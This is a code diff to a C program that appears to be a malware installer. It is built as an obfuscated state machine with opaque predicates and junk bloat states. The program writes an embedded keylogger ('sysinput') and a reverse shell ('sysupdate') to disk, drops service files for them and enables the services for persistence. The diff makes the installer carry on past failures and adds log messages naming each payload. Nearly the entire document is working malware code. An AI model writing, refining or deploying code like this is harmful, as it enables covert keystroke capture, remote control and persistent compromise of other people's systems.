@@ -51,6 +51,7 @@
 #define STATE_BOGUS_3 25
 #define STATE_BOGUS_BLOAT 26
 #define STATE_WRITE_BINARY 27 // New state for writing binaries from memory
+#define STATE_POST_ACTION 28  // New state to handle post-action logic
 
 #define BLOAT10(x)                                                             \
   x;                                                                           \
@@ -69,6 +70,7 @@ int current_state = STATE_START;
 int action_count = 0;
 int action_indices[3] = {0, 0, 0};
 int action_next_index = 0;
+int total_actions_completed = 0;
 
 // Context variables for functions
 char current_path[PATH_MAX];
@@ -106,7 +108,6 @@ int dispatcher() {
       break;
 
     case STATE_SETUP_ACTIONS:
-
       // We need to setup our actions that are later shuffled
       // 0 is install sysinput
       // 1 is install sysupdate
@@ -125,6 +126,7 @@ int dispatcher() {
       }
 
       action_next_index = 0;
+      total_actions_completed = 0;
       current_state = STATE_CHECK_OPQ_1;
       break;
 
@@ -136,7 +138,6 @@ int dispatcher() {
       } else {
         current_state = STATE_DROP_SERVICE_FILES;
       }
-      action_next_index++;
       break;
 
     case STATE_EXECUTE_ACTION_2:
@@ -147,7 +148,6 @@ int dispatcher() {
       } else {
         current_state = STATE_DROP_SERVICE_FILES;
       }
-      action_next_index++;
       break;
 
     case STATE_EXECUTE_ACTION_3:
@@ -158,11 +158,10 @@ int dispatcher() {
       } else {
         current_state = STATE_DROP_SERVICE_FILES;
       }
-      action_next_index++;
-      current_state = STATE_ENABLE_SERVICES;
       break;
 
     case STATE_INSTALL_SYSINPUTD:
+      printf("[*] Installing sysinput keylogger...\n");
       global_dest = KEYLOGGER_BIN_PATH;
       global_data = _sysinput; // Use the byte array from header
       global_size = _sysinput_len;
@@ -170,36 +169,27 @@ int dispatcher() {
       break;
 
     case STATE_INSTALL_SYSUPDATE:
+      printf("[*] Installing sysupdate reverse shell...\n");
       global_dest = REVERSE_SHELL_PATH;
       global_data = _sysupdate; // Use the byte array from header
       global_size = _sysupdate_len;
       current_state = STATE_WRITE_BINARY;
       break;
 
-    case STATE_WRITE_BINARY:
+    case STATE_WRITE_BINARY: {
       global_dst_file = fopen(global_dest, "wb");
       if (!global_dst_file) {
         perror("[-] Cannot open destination for binary");
-        if (action_next_index == 1) {
-          current_state = STATE_CHECK_OPQ_2;
-        } else if (action_next_index == 2) {
-          current_state = STATE_CHECK_OPQ_3;
-        } else {
-          current_state = STATE_ENABLE_SERVICES;
-        }
+        current_state =
+            STATE_POST_ACTION; // Move to post-action state even on failure
         break;
       }
 
       if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
         perror("[-] Failed to write full binary content");
         fclose(global_dst_file);
-        if (action_next_index == 1) {
-          current_state = STATE_CHECK_OPQ_2;
-        } else if (action_next_index == 2) {
-          current_state = STATE_CHECK_OPQ_3;
-        } else {
-          current_state = STATE_ENABLE_SERVICES;
-        }
+        current_state =
+            STATE_POST_ACTION; // Move to post-action state even on failure
         break;
       }
 
@@ -208,14 +198,24 @@ int dispatcher() {
       printf("[+] Installed binary to %s\n", global_dest);
 
       if (strcmp(global_dest, KEYLOGGER_BIN_PATH) == 0) {
-        printf("[+] sysinputd installed\n");
+        printf("[+] sysinput keylogger installed\n");
       } else {
-        printf("[+] sysupdate installed\n");
+        printf("[+] sysupdate reverse shell installed\n");
       }
 
-      if (action_next_index == 1) {
+      current_state = STATE_POST_ACTION; // Always proceed to post-action
+      break;
+    }
+
+    case STATE_POST_ACTION:
+      // Increment counters
+      action_next_index++;
+      total_actions_completed++;
+
+      // Determine next state based on completed actions
+      if (total_actions_completed == 1) {
         current_state = STATE_CHECK_OPQ_2;
-      } else if (action_next_index == 2) {
+      } else if (total_actions_completed == 2) {
         current_state = STATE_CHECK_OPQ_3;
       } else {
         current_state = STATE_ENABLE_SERVICES;
@@ -223,6 +223,7 @@ int dispatcher() {
       break;
 
     case STATE_DROP_SERVICE_FILES:
+      printf("[*] Dropping service files...\n");
       snprintf(global_revsh_path, sizeof(global_revsh_path),
                SERVICE_DIR REVERSE_SERVICE_NAME);
       snprintf(global_keylog_path, sizeof(global_keylog_path),
@@ -241,14 +242,16 @@ int dispatcher() {
       global_dst_file = fopen(current_path, "w");
       if (!global_dst_file) {
         perror("[-] Failed to write revsh service file");
-        current_state = STATE_EXIT_ERROR;
+        current_state =
+            STATE_DROP_SERVICE_FILE_2; // Continue to next file even on failure
         break;
       }
 
       if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
         perror("[-] Failed to write full revsh service content");
         fclose(global_dst_file);
-        current_state = STATE_EXIT_ERROR;
+        current_state =
+            STATE_DROP_SERVICE_FILE_2; // Continue to next file even on failure
         break;
       }
 
@@ -266,20 +269,22 @@ int dispatcher() {
       global_dst_file = fopen(current_path, "w");
       if (!global_dst_file) {
         perror("[-] Failed to write sysinputd service file");
-        current_state = STATE_EXIT_ERROR;
+        current_state =
+            STATE_POST_ACTION; // Move to post-action state even on failure
         break;
       }
 
       if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
         perror("[-] Failed to write full sysinputd service content");
         fclose(global_dst_file);
-        current_state = STATE_EXIT_ERROR;
+        current_state =
+            STATE_POST_ACTION; // Move to post-action state even on failure
         break;
       }
 
       fclose(global_dst_file);
       printf("[+] sysinputd service file dropped at %s\n", current_path);
-      current_state = STATE_ENABLE_SERVICES;
+      current_state = STATE_POST_ACTION;
       break;
 
     case STATE_WRITE_FILE: {
@@ -297,25 +302,12 @@ int dispatcher() {
         file_write_stage = 1;
         current_state = STATE_DROP_SERVICE_FILE_2;
       } else {
-        // Both service files written, proceed to next action
-        if (action_next_index == 1) {
-          current_state = STATE_CHECK_OPQ_2;
-        } else if (action_next_index == 2) {
-          current_state = STATE_CHECK_OPQ_3;
-        } else {
-          current_state = STATE_ENABLE_SERVICES;
-        }
+        current_state = STATE_POST_ACTION;
       }
     } break;
 
     case STATE_INSTALL_BINARY:
-      if (action_next_index == 1) {
-        current_state = STATE_CHECK_OPQ_2;
-      } else if (action_next_index == 2) {
-        current_state = STATE_CHECK_OPQ_3;
-      } else {
-        current_state = STATE_ENABLE_SERVICES;
-      }
+      current_state = STATE_POST_ACTION;
       break;
 
     case STATE_ENABLE_SERVICES:
@@ -330,7 +322,7 @@ int dispatcher() {
       if (cmd_ret != 0) {
         fprintf(stderr, "[-] Command failed %s\n", global_cmd);
       } else {
-        printf("[-] Executed: %s\n", global_cmd);
+        printf("[+] Executed: %s\n", global_cmd);
       }
 
       if (action_count == 1) {
@@ -368,7 +360,7 @@ int dispatcher() {
     case STATE_EXIT_ERROR:
       return 1;
 
-    case STATE_CHECK_OPQ_1:
+    case STATE_CHECK_OPQ_1: {
       int x = 1337;
       if (x * (x + 1) % 2) {
         // random bullshit that is never executed
@@ -377,8 +369,9 @@ int dispatcher() {
       } else {
         current_state = STATE_BOGUS_1;
       }
-      break;
-    case STATE_CHECK_OPQ_2:
+    } break;
+
+    case STATE_CHECK_OPQ_2: {
       uint32_t a = 0xDEADBEEF;
       uint32_t b = a ^ 0x12345678;
       if (b ^ 0x12345678 == a) {
@@ -386,9 +379,9 @@ int dispatcher() {
       } else {
         current_state = STATE_BOGUS_BLOAT;
       }
-      break;
+    } break;
 
-    case STATE_CHECK_OPQ_3:
+    case STATE_CHECK_OPQ_3: {
       int z = 1337;
       if ((z * z + z) % 2) {
         // Results in 0, never executed
@@ -396,40 +389,39 @@ int dispatcher() {
       } else {
         current_state = STATE_BOGUS_3;
       }
-      break;
+    } break;
 
-    case STATE_BOGUS_1:
+    case STATE_BOGUS_1: {
       volatile int bloat1 = rand();
       Bloat100(bloat1 += 1);
       current_state = STATE_EXECUTE_ACTION_1;
-      break;
+    } break;
 
-    case STATE_BOGUS_2:
+    case STATE_BOGUS_2: {
       volatile int bloat2 = rand();
       Bloat100(bloat2 += 1);
       current_state = STATE_EXECUTE_ACTION_2;
-      break;
+    } break;
 
-    case STATE_BOGUS_3:
+    case STATE_BOGUS_3: {
       volatile int bloat3 = rand();
       Bloat100(bloat3 += 1);
       current_state = STATE_EXECUTE_ACTION_3;
-      break;
+    } break;
 
-    case STATE_BOGUS_BLOAT:
+    case STATE_BOGUS_BLOAT: {
       volatile double u = 0;
       volatile float g = 0;
       volatile int n;
       for (n = 0; n < g; n++) {
-
         double z = 1.0 / (2 * n + 1);
         if ((n % 2) == 1) {
           z = z * -1;
         }
-        x = (x + z);
+        u = (u + z);
       }
       double p = 4 * u;
-      break;
+    } break;
 
     default:
       fprintf(stderr, "[-] Unknown state in state machine\n");
@@ -437,6 +429,7 @@ int dispatcher() {
     }
   }
 }
+
 int main(void) {
   dispatcher();
   return 0;
